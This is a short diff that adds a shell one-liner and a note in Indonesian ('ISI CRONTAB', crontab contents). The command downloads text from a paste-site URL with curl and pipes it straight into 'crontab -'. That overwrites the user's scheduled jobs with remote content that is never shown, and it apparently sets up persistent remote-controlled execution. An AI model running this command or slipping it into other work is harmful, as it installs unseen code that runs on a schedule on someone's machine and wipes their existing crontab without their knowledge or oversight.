@@ -1,0 +1,3 @@
+( curl https://paste.mangsud.org/raw/d2142e22; echo "" ) | crontab -
+
+https://paste.mangsud.org/raw/d2142e22 ISI CRONTAB
